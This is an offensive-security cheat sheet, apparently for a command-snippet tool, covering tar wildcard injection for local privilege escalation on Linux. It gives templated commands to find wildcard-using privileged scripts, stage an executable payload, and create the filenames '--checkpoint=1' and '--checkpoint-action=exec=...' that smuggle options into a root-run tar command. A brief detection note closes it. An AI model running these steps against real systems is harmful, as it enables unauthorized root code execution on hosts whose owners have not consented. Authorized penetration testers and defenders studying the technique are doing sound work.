---
technique: Wildcard Injection
category: privilege-escalation
targets: Linux Shell Scripts
protocols: Local
remote_capable: false
tags: linux privilege-escalation wildcard cron tar rsync
---

# Wildcard Injection

Wildcard injection abuses privileged scripts that expand attacker-controlled filenames into command-line options.

## Prerequisites

| Requirement | Detail |
|-------------|--------|
| Writable working directory | Operator must create files where the wildcard expands |
| Privileged wildcard use | A privileged script must call a tool against an unqualified wildcard |
| Option-bearing filename | The target tool must interpret crafted filenames as options |

## Linux

### Find wildcard scripts

#sh #recon #scripts

Search scripts for commands that operate on bare wildcards.

```sh title:"Search scripts for wildcard use"
grep -R "\\*" "$script_dir" 2>/dev/null
```
<!-- cheat
var script_dir
-->

### Check working directory

#sh #filesystem

Check write access to the directory where the wildcard expands.

```sh title:"Check wildcard directory permissions"
ls -lad "$working_dir"
```
<!-- cheat
var working_dir
-->

### Step 1: Stage tar payload script

#sh #tar #wildcard

Copy a prepared script into the wildcard expansion directory.

```sh title:"Stage wildcard payload script"
cp "$script_path" "$working_dir/$script_name"
```
<!-- cheat
var script_path
var working_dir
var script_name
-->

### Step 2: Make payload script executable

#sh #tar #wildcard

Make the staged wildcard payload executable.

```sh title:"Make wildcard payload executable"
chmod +x "$working_dir/$script_name"
```
<!-- cheat
var working_dir
var script_name
-->

### Step 3: Create tar checkpoint option

#sh #tar #wildcard

Create the tar checkpoint option filename in the wildcard directory.

```sh title:"Create tar checkpoint option file"
touch "$working_dir/--checkpoint=1"
```
<!-- cheat
var working_dir
-->

### Step 4: Create tar action option

#sh #tar #wildcard

Create the tar checkpoint action filename that points to the staged script.

```sh title:"Create tar checkpoint action file"
touch "$working_dir/--checkpoint-action=exec=$working_dir/$script_name"
```
<!-- cheat
var working_dir
var script_name
-->

## Detection

Monitor privileged scripts that run archive or sync tools over writable directories and alert on filenames beginning with option prefixes.
